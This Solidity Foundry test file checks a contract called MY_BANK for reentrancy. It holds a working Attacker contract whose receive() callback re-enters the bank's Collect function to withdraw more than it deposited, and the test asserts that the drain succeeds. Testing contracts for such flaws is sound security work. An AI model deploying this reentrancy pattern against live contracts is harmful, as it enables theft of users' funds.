
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max / 4);

        vm.deal(address(this), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 4);

        // Attacker deposits into the bank via setupAttack
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Warp time so that unlockTime condition passes
        vm.warp(block.timestamp + 1 days);

        // Trigger the attack
        _attacker.attack(attackVal);

        // Verify that the attacker drained more than their initial deposit
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into the bank; this will set balance and unlockTime
        _victim.Put{value: val}(block.timestamp + 1 days);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // First call to Collect; this will trigger the first external call to this contract
        _victim.Collect(val);

        // After Collect completes (including re-entrancy), check if we gained extra funds
        if (address(this).balance > initialSnapshot + val / 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // Perform a single re-entrant call to Collect before the victim updates its state
        if (attackCallCount == 0) {
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
